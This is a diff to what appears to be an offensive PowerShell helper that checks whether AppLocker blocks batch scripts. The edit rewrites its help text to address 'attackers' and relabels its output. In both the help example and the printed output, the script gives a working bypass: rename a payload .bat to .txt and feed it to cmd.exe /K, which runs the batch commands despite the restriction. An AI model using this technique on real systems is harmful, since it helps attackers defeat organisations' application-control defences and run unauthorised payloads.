@@ -144,8 +144,8 @@ If($TestBat -ieq "TestBypass"){
       Helper - Test AppLocker Batch Execution Restrictions bypass
 
    .DESCRIPTION
-      This Function tests if BATCH scripts are blocked by AppLocker Windows Security
-      and presents the how-to-bypass cmdline to user if the bat execution its locked.
+      This function allow attackers to check if batch script execution its beeing blocked
+      by applocker and presents to attacker the cmdline required to bypass batch execution.
 
    .NOTES
       This CmdLet creates $Env:TMP\logfile.txt to check the batch execution status.
@@ -167,8 +167,8 @@ If($TestBat -ieq "TestBypass"){
       [i] trying to execute applock.txt text file
       [+] success: execution restriction bypassed!
 
-      Bypass Instructions
-      -------------------
+      [powershell] Bypass Instructions
+      --------------------------------
       Move-Item -Path "Payload.bat" -Destination "Payload.txt" -Force
       cmd.exe "cmd.exe /K < Payload.txt"
    #>
@@ -223,8 +223,8 @@ If($TestBat -ieq "TestBypass"){
          Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
          Write-Host "[+] success: execution restriction bypassed!" -ForegroundColor Green
          Start-Sleep -Seconds 1
-         Write-Host "`nBypass Instructions" -ForegroundColor Green
-         Write-Host "-------------------"
+         Write-Host "`n[powershell] Bypass Instructions" -ForegroundColor Green
+         Write-Host "--------------------------------"
          Write-Host "Move-Item -Path `"Payload.bat`" -Destination `"Payload.txt`" -Force"
          Write-Host "cmd.exe `"cmd.exe /K < Payload.txt`"`n"
 
